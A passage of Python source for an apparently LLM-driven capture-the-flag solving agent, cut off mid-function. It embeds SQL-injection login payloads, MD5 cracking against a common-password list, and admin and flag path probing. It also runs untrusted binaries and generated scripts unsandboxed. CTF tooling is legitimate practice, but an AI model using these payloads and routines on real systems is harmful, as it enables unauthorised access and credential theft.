"""
Reasoning-First CTF Agent
Follows workflow: Reasoning → Tool Usage → Script Writing
"""

import os
import json
import logging
import subprocess
import tempfile
from typing import Optional
from pathlib import Path

from helper.ctf_challenge import CTFChallengeClient
from helper.agent_boilerplate import AgentInterface
from helper.llm_helper import LiteLLMManager
from mcp_tools.ghidra_mcp import GhidraMCP
from mcp_tools.kali_mcp import KaliMCP


class ReasoningAgent(AgentInterface):
    """
    Agent that uses reasoning-first approach to solve CTF challenges.

    Workflow:
    1. Reasoning Phase: Analyze challenge and create solution strategy
    2. Tool Phase: Use appropriate tools (Ghidra, strings, file, etc.)
    3. Script Phase: Write and execute scripts if needed
    4. Validation Phase: Verify and submit flag
    """

    def __init__(self, lite_llm_manager: LiteLLMManager, logger: Optional[logging.Logger] = None):
        self.lite_llm_manager = lite_llm_manager
        self.logger = logger or logging.getLogger(__name__)

        # Initialize tools
        self.ghidra_mcp = GhidraMCP()
        self.kali_mcp = KaliMCP()

    def solve_challenge(self, challenge: CTFChallengeClient) -> Optional[str]:
        """Main solving method following reasoning → tools → scripts workflow."""
        self.logger.info(f"=== Reasoning Agent solving: {challenge.challenge.name} ===")
        self.logger.info(f"Description: {challenge.challenge.description}")
        self.logger.info(f"Categories: {challenge.challenge.categories}")

        try:
            # Phase 1: REASONING - Analyze and plan approach
            self.logger.info("\n=== PHASE 1: REASONING ===")
            strategy = self._reasoning_phase(challenge)
            self.logger.info(f"Strategy: {strategy}")

            # Phase 2: TOOLS - Use tools based on strategy
            self.logger.info("\n=== PHASE 2: TOOL USAGE ===")
            tool_results = self._tool_phase(challenge, strategy)
            self.logger.info(f"Tool results collected: {len(tool_results)} items")

            # Phase 3: SCRIPTS - Write and execute scripts if needed
            self.logger.info("\n=== PHASE 3: SCRIPT WRITING ===")
            script_results = self._script_phase(challenge, strategy, tool_results)

            # Phase 4: VALIDATION - Extract and validate flag
            self.logger.info("\n=== PHASE 4: VALIDATION ===")
            flag = self._validation_phase(challenge, strategy, tool_results, script_results)

            if flag:
                self.logger.info(f"✓ Flag found: {flag}")
                return flag
            else:
                self.logger.warning("✗ No flag found")
                return None

        except Exception as e:
            self.logger.error(f"Agent failed: {e}", exc_info=True)
            return None

    def _reasoning_phase(self, challenge: CTFChallengeClient) -> dict:
        """Phase 1: Use LLM to reason about the challenge and create strategy."""

        # List available artifacts
        artifacts_info = ""
        if os.path.exists(challenge.working_folder):
            artifacts = []
            for root, dirs, files in os.walk(challenge.working_folder):
                for f in files:
                    filepath = os.path.join(root, f)
                    size = os.path.getsize(filepath)
                    artifacts.append(f"  - {f} ({size} bytes)")
            artifacts_info = "\n".join(artifacts) if artifacts else "  (no files)"

        network_info = ""
        if challenge.network_info:
            network_info = f"""
Network Information:
  - Network: {challenge.network_info.get('network_name', 'N/A')}
  - Services: {', '.join(challenge.network_info.get('services_deployed', []))}
"""

        reasoning_prompt = f"""You are an expert CTF player analyzing a challenge. Use reasoning to create a solution strategy.

Challenge: {challenge.challenge.name}
Description: {challenge.challenge.description}
Categories: {challenge.challenge.categories}
Flag Format: {challenge.challenge.flag_regex}

Available Artifacts:
{artifacts_info}
{network_info}

Your task is to REASON about this challenge step-by-step:

1. ANALYZE: What type of challenge is this? What techniques are likely needed?
2. IDENTIFY: What tools or methods would be most effective?
3. PLAN: What specific steps should be taken to find the flag?

Respond in JSON format:
{{
  "challenge_type": "crypto|rev|web|pwn|forensics",
  "difficulty_assessment": "easy|medium|hard",
  "key_insights": ["insight1", "insight2"],
  "recommended_tools": ["tool1", "tool2"],
  "solution_steps": ["step1", "step2", "step3"],
  "scripts_needed": ["script_type1", "script_type2"] or []
}}

Think carefully and provide a detailed analysis."""

        llm_client = self.lite_llm_manager.create_client()
        response = llm_client.simple_call("gpt-4o-mini", reasoning_prompt)

        response_text = response.choices[0].message.content.strip()
        self.logger.info(f"LLM Reasoning:\n{response_text}\n")

        # Parse JSON response
        try:
            # Extract JSON from markdown code blocks if present
            if "```json" in response_text:
                response_text = response_text.split("```json")[1].split("```")[0].strip()
            elif "```" in response_text:
                response_text = response_text.split("```")[1].split("```")[0].strip()

            strategy = json.loads(response_text)
            return strategy
        except json.JSONDecodeError:
            self.logger.warning("Could not parse JSON strategy, using default")
            return {
                "challenge_type": "unknown",
                "recommended_tools": ["strings", "file"],
                "solution_steps": ["Analyze files", "Look for patterns"],
                "scripts_needed": []
            }

    def _tool_phase(self, challenge: CTFChallengeClient, strategy: dict) -> dict:
        """Phase 2: Execute tools based on strategy."""
        results = {}
        recommended_tools = strategy.get("recommended_tools", [])

        # Get list of artifact files
        artifact_files = []
        if os.path.exists(challenge.working_folder):
            for root, dirs, files in os.walk(challenge.working_folder):
                for f in files:
                    artifact_files.append(os.path.join(root, f))

        self.logger.info(f"Found {len(artifact_files)} artifact files")
        self.logger.info(f"Recommended tools: {recommended_tools}")

        # Run basic analysis tools on artifacts
        for artifact_path in artifact_files:
            filename = os.path.basename(artifact_path)
            results[filename] = {}

            # Read file content directly first (most reliable)
            try:
                with open(artifact_path, 'r', errors='ignore') as f:
                    file_content = f.read()
                    results[filename]['content'] = file_content

                    # Look for flag in content
                    import re
                    flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')
                    matches = re.findall(flag_pattern, file_content, re.IGNORECASE)
                    if matches:
                        # Filter out placeholder/fake flags
                        # Be extra cautious - only mark as candidate if file looks simple
                        for match in matches:
                            # Skip obvious fake flags
                            if '...' in match or 'xxx' in match.lower() or 'your' in match.lower():
                                continue
                            # If flag is in Python script with server code, it might be fake
                            if filename.endswith('.py') and ('HTTPServer' in file_content or 'BaseHTTPRequestHandler' in file_content):
                                self.logger.info(f"⚠️  Skipping potential fake flag in web server script {filename}: {match}")
                                continue
                            self.logger.info(f"⭐ Found flag in {filename}: {match}")
                            results[filename]['flag_candidate'] = match
                            break

                    # Check for base64 encoded data
                    import base64
                    b64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', file_content)
                    for b64_str in b64_patterns[:10]:  # Limit to first 10
                        try:
                            decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
                            matches = re.findall(flag_pattern, decoded, re.IGNORECASE)
                            if matches:
                                self.logger.info(f"⭐ Found flag in base64 decoded data: {matches[0]}")
                                results[filename]['flag_candidate'] = matches[0]
                                break
                        except:
                            pass

                    # If it's a Python file, try to execute it and analyze output
                    if filename.endswith('.py'):
                        try:
                            # Check if it's a server script
                            is_server = 'HTTPServer' in file_content or 'serve_forever' in file_content or 'socket' in file_content

                            if is_server:
                                self.logger.info(f"Detected server script {filename} - needs special handling")
                                # Don't execute server scripts directly, they'll be handled in script phase
                                results[filename]['is_server'] = True
                            else:
                                exec_result = subprocess.run(['python3', artifact_path],
                                                            capture_output=True, text=True,
                                                            timeout=10)
                                output = exec_result.stdout + exec_result.stderr
                                matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match:
                                            self.logger.info(f"⭐ Found flag by executing Python script: {match}")
                                            results[filename]['flag_candidate'] = match
                                            break

                                # Also check for base64 in output
                                for b64_str in re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', output):
                                    try:
                                        decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
                                        matches = re.findall(flag_pattern, decoded, re.IGNORECASE)
                                        if matches:
                                            self.logger.info(f"⭐ Found flag in Python script output (base64): {matches[0]}")
                                            results[filename]['flag_candidate'] = matches[0]
                                            break
                                    except:
                                        pass
                        except Exception as e:
                            self.logger.warning(f"Failed to execute Python script {filename}: {e}")

                    # Also check for vertical/hidden flags
                    lines = file_content.split('\n')

                    # Check first character of each line
                    vertical_first = ''.join([line[0] if line else '' for line in lines])
                    matches = re.findall(flag_pattern, vertical_first, re.IGNORECASE)
                    if matches:
                        self.logger.info(f"⭐ Found vertical flag (first char) in {filename}: {matches[0]}")
                        results[filename]['flag_candidate'] = matches[0]

                    # Check last character of each line
                    vertical_last = ''.join([line[-1] if line else '' for line in lines])
                    matches = re.findall(flag_pattern, vertical_last, re.IGNORECASE)
                    if matches:
                        self.logger.info(f"⭐ Found vertical flag (last char) in {filename}: {matches[0]}")
                        results[filename]['flag_candidate'] = matches[0]

                    # Try crypto transformations if this looks like a crypto challenge
                    if "crypto" in str(strategy.get("challenge_type", "")).lower():
                        # Try ROT13 and all Caesar shifts
                        for shift in range(26):
                            shifted = ''.join([chr((ord(c) - ord('a') + shift) % 26 + ord('a')) if 'a' <= c <= 'z'
                                             else chr((ord(c) - ord('A') + shift) % 26 + ord('A')) if 'A' <= c <= 'Z'
                                             else c for c in file_content])
                            matches = re.findall(flag_pattern, shifted, re.IGNORECASE)
                            if matches:
                                self.logger.info(f"⭐ Found flag with ROT{shift} in {filename}: {matches[0]}")
                                results[filename]['flag_candidate'] = matches[0]
                                break

                    self.logger.info(f"Read {len(file_content)} bytes from {filename}")
            except Exception as e:
                self.logger.warning(f"Direct file read failed: {e}")

            # File command
            if "file" in str(recommended_tools).lower() or not recommended_tools:
                try:
                    file_result = subprocess.run(['file', artifact_path],
                                                capture_output=True, text=True, timeout=5)
                    results[filename]['file'] = file_result.stdout.strip()
                    self.logger.info(f"file {filename}: {file_result.stdout.strip()}")
                except Exception as e:
                    self.logger.warning(f"file command failed: {e}")

            # Strings command
            if "strings" in str(recommended_tools).lower() or not recommended_tools:
                try:
                    strings_result = subprocess.run(['strings', artifact_path],
                                                   capture_output=True, text=True, timeout=10)
                    strings_output = strings_result.stdout.strip().split('\n')
                    results[filename]['strings'] = strings_output[:100]  # Limit output

                    # Look for flag patterns in strings
                    flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')
                    for string in strings_output:
                        if re.search(flag_pattern, string, re.IGNORECASE):
                            self.logger.info(f"⭐ Potential flag in strings: {string}")
                            if 'flag_candidate' not in results[filename]:
                                results[filename]['flag_candidate'] = string
                except Exception as e:
                    self.logger.warning(f"strings command failed: {e}")

            # Binary analysis for reverse engineering challenges
            is_rev_challenge = "rev" in str(strategy.get("challenge_type", "")).lower()
            is_executable = "executable" in results.get(filename, {}).get('file', '').lower() or "ELF" in results.get(filename, {}).get('file', '')

            if is_rev_challenge or is_executable:
                try:
                    # Try running the binary if it's executable
                    if os.access(artifact_path, os.X_OK) or "executable" in results.get(filename, {}).get('file', '').lower():
                        # Make it executable first
                        subprocess.run(['chmod', '+x', artifact_path], timeout=5)

                        # Try running with strings command to extract embedded data
                        strings_result = subprocess.run(['strings', artifact_path],
                                                       capture_output=True, text=True, timeout=10)
                        strings_output = strings_result.stdout

                        # Look for XOR patterns or encrypted data
                        import re
                        flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')

                        # Check strings output
                        matches = re.findall(flag_pattern, strings_output, re.IGNORECASE)
                        if matches:
                            for match in matches:
                                if '...' not in match:
                                    self.logger.info(f"⭐ Found flag in binary strings: {match}")
                                    results[filename]['flag_candidate'] = match
                                    break

                        # Try running the binary with common inputs
                        for test_input in ['', 'flag', 'admin', '0'*32, '1'*32]:
                            try:
                                run_result = subprocess.run([artifact_path],
                                                          input=test_input,
                                                          capture_output=True,
                                                          text=True,
                                                          timeout=5)
                                output = run_result.stdout + run_result.stderr
                                matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match:
                                            self.logger.info(f"⭐ Found flag by running binary: {match}")
                                            results[filename]['flag_candidate'] = match
                                            break
                            except subprocess.TimeoutExpired:
                                pass
                            except Exception as e:
                                self.logger.warning(f"Failed to run binary with input '{test_input}': {e}")

                except Exception as e:
                    self.logger.warning(f"Binary analysis failed: {e}")

        # Network scanning for web challenges
        if challenge.network_info and "web" in str(strategy.get("challenge_type", "")).lower():
            try:
                services = challenge.network_info.get('services_deployed', [])
                for service in services:
                    self.logger.info(f"Attempting to connect to service: {service}")

                    # Try common paths
                    common_paths = ['/', '/admin', '/admin.php', '/login', '/robots.txt', '/flag', '/flag.txt']
                    for path in common_paths:
                        try:
                            url = f'http://{service}{path}'
                            curl_result = subprocess.run(['curl', '-s', url],
                                                        capture_output=True, text=True, timeout=10)
                            response_text = curl_result.stdout
                            results[f'service_{service}_{path}'] = {'http_response': response_text[:1000]}
                            self.logger.info(f"HTTP {path} from {service}: {len(response_text)} bytes")

                            # Check for flag in response
                            import re
                            flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')
                            matches = re.findall(flag_pattern, response_text, re.IGNORECASE)
                            if matches:
                                self.logger.info(f"⭐ Found flag in HTTP response from {url}: {matches[0]}")
                                results[f'service_{service}_{path}']['flag_candidate'] = matches[0]
                        except Exception as e:
                            self.logger.warning(f"HTTP connection to {service}{path} failed: {e}")

                    # Try SQL injection for SQL challenges
                    if "sql" in str(challenge.challenge.categories).lower():
                        sql_payloads = [
                            ("admin' OR '1'='1", "password"),
                            ("admin'--", "password"),
                            ("' OR 1=1--", "' OR 1=1--"),
                            ("admin' OR 1=1--", "anything"),
                        ]
                        for username, password in sql_payloads:
                            try:
                                # Use curl with cookie jar and follow redirects
                                curl_result = subprocess.run([
                                    'curl', '-s', '-L', '-c', '/tmp/cookies.txt', '-b', '/tmp/cookies.txt',
                                    '-X', 'POST', f'http://{service}/login',
                                    '-d', f'username={username}&password={password}'
                                ], capture_output=True, text=True, timeout=10)
                                response_text = curl_result.stdout
                                self.logger.info(f"SQL injection attempt: {username} - {len(response_text)} bytes")

                                import re
                                flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')
                                matches = re.findall(flag_pattern, response_text, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match:
                                            self.logger.info(f"⭐ Found flag via SQL injection: {match}")
                                            results[f'sqli_{service}'] = {'flag_candidate': match}
                                            break
                            except Exception as e:
                                self.logger.warning(f"SQL injection attempt failed: {e}")

            except Exception as e:
                self.logger.warning(f"Network scanning failed: {e}")

        return results

    def _script_phase(self, challenge: CTFChallengeClient, strategy: dict, tool_results: dict) -> dict:
        """Phase 3: Write and execute scripts based on strategy and tool results."""
        script_results = {}
        scripts_needed = strategy.get("scripts_needed", [])

        # Auto-detect if scripts are needed even if strategy doesn't say so
        challenge_type = strategy.get("challenge_type", "").lower()
        categories = str(challenge.challenge.categories).lower()

        # Check if we have server scripts that need interaction
        has_server_script = False
        for filename, file_results in tool_results.items():
            if file_results.get('is_server', False):
                has_server_script = True
                self.logger.info(f"Found server script {filename} requiring interaction")
                scripts_needed.append("server_interaction")
                break

        # Generate script for SQL injection if needed
        if "sql" in categories and "web" in challenge_type:
            if challenge.network_info:
                self.logger.info("Generating SQL injection script")
                scripts_needed.append("sql_injection")

        # Generate script for binary reverse engineering if needed
        if "rev" in challenge_type or "crypto" in categories:
            # Check if we have binary artifacts or Python scripts to reverse
            for filename in tool_results.keys():
                if 'content' in tool_results[filename]:
                    file_content = tool_results[filename].get('content', '')
                    # Check for hash values in Python scripts
                    if filename.endswith('.py') and ('sha' in file_content or 'md5' in file_content or 'hash' in file_content):
                        if not has_server_script:  # Prefer server_interaction over hash_reversal
                            scripts_needed.append("hash_reversal")
                        break
                    elif not filename.endswith('.txt') and not filename.endswith('.md'):
                        scripts_needed.append("binary_analysis")
                        break

        if not scripts_needed:
            self.logger.info("No scripts needed according to strategy")
            return script_results

        self.logger.info(f"Scripts to generate: {scripts_needed}")

        # Prepare context for script generation
        context = {
            "challenge": {
                "name": challenge.challenge.name,
                "description": challenge.challenge.description,
                "categories": challenge.challenge.categories,
                "flag_regex": challenge.challenge.flag_regex
            },
            "strategy": strategy,
            "tool_results_summary": self._summarize_tool_results(tool_results),
            "network_info": challenge.network_info if challenge.network_info else None
        }

        # Handle specific script types
        if "server_interaction" in scripts_needed:
            script_code = self._generate_server_interaction_script(challenge, context, tool_results)
        elif "sql_injection" in scripts_needed:
            script_code = self._generate_sql_injection_script(challenge, context)
        elif "hash_reversal" in scripts_needed:
            script_code = self._generate_hash_reversal_script(challenge, context, tool_results)
        elif "binary_analysis" in scripts_needed:
            script_code = self._generate_binary_analysis_script(challenge, context, tool_results)
        else:
            # Generic script generation
            script_prompt = f"""Based on the challenge analysis, write a Python script to solve this challenge.

Context:
{json.dumps(context, indent=2)}

Requirements:
1. Write a complete, executable Python script
2. Include error handling
3. Print the flag when found
4. Use appropriate libraries (requests, pwntools, etc. if available)

Respond with ONLY the Python script code, no explanations. Start with #!/usr/bin/env python3"""

            llm_client = self.lite_llm_manager.create_client()
            response = llm_client.simple_call("gpt-4o-mini", script_prompt)
            script_code = response.choices[0].message.content.strip()

        self.logger.info(f"Generated script:\n{script_code}\n")

        # Extract code from markdown if present
        if "```python" in script_code:
            script_code = script_code.split("```python")[1].split("```")[0].strip()
        elif "```" in script_code:
            script_code = script_code.split("```")[1].split("```")[0].strip()

        # Execute the script
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(script_code)
                script_path = f.name

            self.logger.info(f"Executing script: {script_path}")
            result = subprocess.run(['python3', script_path],
                                   capture_output=True, text=True,
                                   timeout=30,
                                   cwd=challenge.working_folder)

            script_results['output'] = result.stdout
            script_results['errors'] = result.stderr
            script_results['returncode'] = result.returncode

            self.logger.info(f"Script output:\n{result.stdout}")
            if result.stderr:
                self.logger.warning(f"Script errors:\n{result.stderr}")

            os.unlink(script_path)
        except Exception as e:
            self.logger.error(f"Script execution failed: {e}")
            script_results['error'] = str(e)

        return script_results

    def _validation_phase(self, challenge: CTFChallengeClient, strategy: dict,
                         tool_results: dict, script_results: dict) -> Optional[str]:
        """Phase 4: Extract and validate flag from all results."""
        import re

        flag_pattern = challenge.challenge.flag_regex.replace('.*', '.+')
        self.logger.info(f"Looking for flag matching: {flag_pattern}")

        candidates = []

        # Check tool results
        for filename, results in tool_results.items():
            if 'flag_candidate' in results:
                candidates.append(results['flag_candidate'])

            # Check strings
            if 'strings' in results:
                for string in results['strings']:
                    if re.search(flag_pattern, string, re.IGNORECASE):
                        candidates.append(string)

        # Check script output
        if 'output' in script_results:
            for line in script_results['output'].split('\n'):
                if re.search(flag_pattern, line, re.IGNORECASE):
                    candidates.append(line.strip())

        # Validate candidates
        for candidate in candidates:
            matches = re.findall(flag_pattern, candidate, re.IGNORECASE)
            if matches:
                flag = matches[0]
                self.logger.info(f"Validating flag: {flag}")
                if challenge.submit_flag(flag):
                    return flag

        return None

    def _generate_server_interaction_script(self, challenge: CTFChallengeClient, context: dict, tool_results: dict) -> str:
        """Generate a Python script for interacting with a hidden web server."""

        # Find the server script and related files
        server_file = None
        for filename, results in tool_results.items():
            if results.get('is_server', False):
                server_file = filename
                break

        # Find files with base64 or credentials
        credential_files = []
        for filename, results in tool_results.items():
            content = results.get('content', '')
            if 'base64' in content or 'credentials' in content.lower() or 'encoded' in content.lower() or 'md5' in content.lower():
                credential_files.append((filename, content))

        script = f'''#!/usr/bin/env python3
import subprocess
import re
import base64
import hashlib
import json
import time
import requests
import os
import signal

flag_pattern = r"{challenge.challenge.flag_regex.replace(chr(92), chr(92)+chr(92))}"

# Server file to start
server_file = "{server_file}" if "{server_file}" else None

# Try to find credentials from other files
credentials = {{}}

# Analyze credential files for hints
credential_files = {repr([(f, c[:500]) for f, c in credential_files])}

for filename, content in credential_files:
    # Look for base64 encoded data
    b64_patterns = re.findall(r'[A-Za-z0-9+/]{{40,}}={{0,2}}', content)
    for b64_str in b64_patterns:
        try:
            decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')
            print(f"Decoded from {{filename}}: {{decoded}}")

            # Look for credentials pattern like "admin/hash" or "credentials: username/hash"
            if '/' in decoded:
                parts = decoded.split('/')
                if len(parts) >= 2:
                    username = parts[0].split(':')[-1].strip()
                    password_hash = parts[1].strip()
                    credentials['username'] = username
                    credentials['password_hash'] = password_hash
                    print(f"Found credentials: {{username}} / {{password_hash}}")

            # Check for port information
            port_match = re.search(r'port\\s+(\\d+)', decoded, re.IGNORECASE)
            if port_match:
                credentials['port'] = int(port_match.group(1))
                print(f"Found port: {{credentials['port']}}")
        except:
            pass

    # Look for MD5 hashes directly in content
    md5_hashes = re.findall(r'["\']([a-f0-9]{{32}})["\']', content)
    if md5_hashes and 'password_hash' not in credentials:
        credentials['password_hash'] = md5_hashes[0]
        print(f"Found MD5 hash: {{md5_hashes[0]}}")

# Common passwords to try for hash cracking
common_passwords = [
    'password', 'admin', 'secret', 'flag', 'vault', 'unlock', '123456',
    'password123', 'admin123', 'qwerty', 'letmein', 'welcome', 'monkey'
]

# Try to crack the MD5 hash if we have one
cracked_password = None
if 'password_hash' in credentials:
    for pwd in common_passwords:
        if hashlib.md5(pwd.encode()).hexdigest() == credentials['password_hash']:
            cracked_password = pwd
            print(f"Cracked password: {{pwd}}")
            break

# Start the server if we have one
server_process = None
if server_file and os.path.exists(server_file):
    os.chmod(server_file, 0o755)
    print(f"Starting server: {{server_file}}")
    server_process = subprocess.Popen(['python3', server_file],
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE)
    time.sleep(2)  # Give server time to start

try:
    # Determine port
    port = credentials.get('port', 8888)
    base_url = f'http://localhost:{{port}}'

    # Try GET requests to common endpoints
    for endpoint in ['/', '/api', '/api/flag', '/admin']:
        try:
            response = requests.get(f'{{base_url}}{{endpoint}}', timeout=5)
            print(f"GET {{endpoint}}: {{response.status_code}}")
            matches = re.findall(flag_pattern, response.text, re.IGNORECASE)
            if matches:
                for match in matches:
                    if '...' not in match and 'xxx' not in match.lower():
                        print(match)
                        raise SystemExit(0)
        except requests.exceptions.RequestException:
            pass

    # Try POST with credentials
    if credentials.get('username') and cracked_password:
        for endpoint in ['/api/login', '/login', '/api', '/auth']:
            try:
                # Try JSON payload
                payload = {{
                    'username': credentials['username'],
                    'password': cracked_password
                }}
                response = requests.post(f'{{base_url}}{{endpoint}}',
                                       json=payload,
                                       timeout=5)
                print(f"POST {{endpoint}} (JSON): {{response.status_code}}")
                matches = re.findall(flag_pattern, response.text, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(match)
                            raise SystemExit(0)

                # Try form data
                response = requests.post(f'{{base_url}}{{endpoint}}',
                                       data=payload,
                                       timeout=5)
                print(f"POST {{endpoint}} (form): {{response.status_code}}")
                matches = re.findall(flag_pattern, response.text, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(match)
                            raise SystemExit(0)
            except requests.exceptions.RequestException as e:
                print(f"Request failed: {{e}}")

finally:
    # Clean up server process
    if server_process:
        server_process.terminate()
        try:
            server_process.wait(timeout=2)
        except:
            server_process.kill()

print("No flag found")
'''
        return script

    def _summarize_tool_results(self, tool_results: dict) -> str:
        """Create a brief summary of tool results for context."""
        summary = []
        for filename, results in tool_results.items():
            file_type = results.get('file', 'unknown')
            summary.append(f"{filename}: {file_type}")
        return "\n".join(summary)

    def _generate_sql_injection_script(self, challenge: CTFChallengeClient, context: dict) -> str:
        """Generate a Python script for SQL injection with proper session handling."""
        service = challenge.network_info.get('services_deployed', ['webapp'])[0] if challenge.network_info else 'webapp'

        script = f'''#!/usr/bin/env python3
import subprocess
import re
import urllib.parse

# SQL Injection script for {challenge.challenge.name}
service = "{service}"
flag_pattern = r"{challenge.challenge.flag_regex.replace(chr(92), chr(92)+chr(92))}"

# SQL injection payloads - try multiple variations
payloads = [
    ("admin' OR '1'='1'--", "password"),
    ("admin'--", "anything"),
    ("' OR 1=1--", "anything"),
    ("admin' OR 1=1--", "anything"),
    ("' OR '1'='1", "' OR '1'='1"),
    ("admin' OR 'a'='a'--", "anything"),
]

for username, password in payloads:
    try:
        # Create cookie jar file
        import tempfile
        cookie_file = tempfile.mktemp(suffix='.txt')

        # Use curl to POST login with form data
        result = subprocess.run([
            'curl', '-s', '-L',
            '-c', cookie_file,
            '-b', cookie_file,
            '-X', 'POST',
            f'http://{{service}}/login',
            '-d', f'username={{username}}&password={{password}}',
            '-H', 'Content-Type: application/x-www-form-urlencoded'
        ], capture_output=True, text=True, timeout=10)

        # Check immediate response for flag
        matches = re.findall(flag_pattern, result.stdout, re.IGNORECASE)
        if matches:
            for match in matches:
                if '...' not in match and 'xxx' not in match.lower():
                    print(match)
                    exit(0)

        # Try accessing dashboard with the session cookie
        dash_result = subprocess.run([
            'curl', '-s', '-L',
            '-b', cookie_file,
            f'http://{{service}}/dashboard'
        ], capture_output=True, text=True, timeout=10)

        matches = re.findall(flag_pattern, dash_result.stdout, re.IGNORECASE)
        if matches:
            for match in matches:
                if '...' not in match and 'xxx' not in match.lower():
                    print(match)
                    # Clean up temp file
                    import os
                    try:
                        os.unlink(cookie_file)
                    except:
                        pass
                    exit(0)

        # Also try /admin endpoint
        admin_result = subprocess.run([
            'curl', '-s', '-L',
            '-b', cookie_file,
            f'http://{{service}}/admin'
        ], capture_output=True, text=True, timeout=10)

        matches = re.findall(flag_pattern, admin_result.stdout, re.IGNORECASE)
        if matches:
            for match in matches:
                if '...' not in match and 'xxx' not in match.lower():
                    print(match)
                    # Clean up temp file
                    import os
                    try:
                        os.unlink(cookie_file)
                    except:
                        pass
                    exit(0)

        # Clean up temp file
        import os
        try:
            os.unlink(cookie_file)
        except:
            pass

    except Exception as e:
        continue

print("No flag found")
'''
        return script

    def _generate_hash_reversal_script(self, challenge: CTFChallengeClient, context: dict, tool_results: dict) -> str:
        """Generate a Python script for reversing hash-based password checks."""

        # Find Python files with hashes
        python_files = []
        for filename, results in tool_results.items():
            if filename.endswith('.py') and 'content' in results:
                python_files.append((filename, results['content']))

        # Get network services
        services = challenge.network_info.get('services_deployed', [])
        service_str = repr(services)

        script = f'''#!/usr/bin/env python3
import hashlib
import base64
import re
import itertools
import string
import subprocess

flag_pattern = r"{challenge.challenge.flag_regex.replace(chr(92), chr(92)+chr(92))}"

# Analyze Python files for hash values
python_files = {repr(python_files)}
services = {service_str}

# Common password wordlist for MD5 cracking
common_passwords = [
    'password', 'admin', 'secret', 'flag', 'vault', 'unlock', '123456',
    'password123', 'admin123', 'qwerty', 'letmein', 'welcome', 'monkey',
    'dragon', '1234', '12345', 'master', 'login', 'abc123', 'password1',
    'pass', 'test', 'root', 'user', 'toor', 'changeme', 'trustno1'
]

def crack_md5(target_hash):
    """Try to crack an MD5 hash using common passwords."""
    for password in common_passwords:
        if hashlib.md5(password.encode()).hexdigest() == target_hash:
            return password
    return None

def try_api_endpoints(service, username, password):
    """Try common API endpoints with credentials."""
    endpoints = ['/api', '/api/flag', '/api/admin', '/api/user', '/dashboard', '/admin']

    for endpoint in endpoints:
        try:
            # Try with basic auth
            url = f'http://{{service}}{{endpoint}}'
            result = subprocess.run([
                'curl', '-s', '-u', f'{{username}}:{{password}}', url
            ], capture_output=True, text=True, timeout=10)

            matches = re.findall(flag_pattern, result.stdout, re.IGNORECASE)
            if matches:
                for match in matches:
                    if '...' not in match and 'xxx' not in match.lower():
                        return match

            # Try with POST data
            result = subprocess.run([
                'curl', '-s', '-X', 'POST', url,
                '-d', f'username={{username}}&password={{password}}'
            ], capture_output=True, text=True, timeout=10)

            matches = re.findall(flag_pattern, result.stdout, re.IGNORECASE)
            if matches:
                for match in matches:
                    if '...' not in match and 'xxx' not in match.lower():
                        return match

        except Exception as e:
            continue

    return None

for filename, content in python_files:
    # Look for hash values (sha256, md5, etc.)
    hash_patterns = {{
        'sha256': re.findall(r'["\']([a-f0-9]{{64}})["\']', content),
        'sha1': re.findall(r'["\']([a-f0-9]{{40}})["\']', content),
        'md5': re.findall(r'["\']([a-f0-9]{{32}})["\']', content),
    }}

    # Try to crack MD5 hashes
    for md5_hash in hash_patterns['md5']:
        cracked = crack_md5(md5_hash)
        if cracked:
            # Look for username in the content or decoded hints
            username = 'admin'  # Default
            if 'admin' in content.lower():
                username = 'admin'
            elif 'user' in content.lower():
                username = 'user'

            # Try API endpoints with cracked password
            for service in services:
                flag = try_api_endpoints(service, username, cracked)
                if flag:
                    print(flag)
                    exit(0)

            # Try running the Python file with the cracked password
            try:
                result = subprocess.run(
                    ['python3', filename],
                    input=cracked.encode(),
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                output = result.stdout + result.stderr
                matches = re.findall(flag_pattern, output, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(match)
                            exit(0)
            except:
                pass

    # Try to reverse the hash by analyzing the transformation
    # Look for simple transformations like chr(ord(c) + 1)
    if 'chr((ord(c)' in content or 'chr(ord(c)' in content:
        # Character transformation detected
        for hash_type, hashes in hash_patterns.items():
            for target_hash in hashes:
                # Try common passwords with transformations
                for password in common_passwords:
                    # Try forward transformation (ord + 1)
                    transformed = ''.join([chr((ord(c) + 1) % 256) for c in password])
                    if hash_type == 'sha256':
                        computed = hashlib.sha256(transformed.encode()).hexdigest()
                    elif hash_type == 'sha1':
                        computed = hashlib.sha1(transformed.encode()).hexdigest()
                    else:
                        computed = hashlib.md5(transformed.encode()).hexdigest()

                    if computed == target_hash:
                        # Now run the script with this password
                        for py_file, _ in python_files:
                            try:
                                result = subprocess.run(
                                    ['python3', py_file],
                                    input=password.encode(),
                                    capture_output=True,
                                    text=True,
                                    timeout=5
                                )
                                output = result.stdout + result.stderr
                                matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match and 'xxx' not in match.lower():
                                            print(match)
                                            exit(0)
                            except:
                                pass

    # Check for base64 encoded flags in the file
    b64_patterns = re.findall(r'[A-Za-z0-9+/]{{20,}}={{0,2}}', content)
    for b64_str in b64_patterns:
        try:
            decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')

            # Check if decoded contains credentials hint
            if 'credentials' in decoded.lower() and '/' in decoded:
                parts = decoded.split('/')
                if len(parts) >= 2:
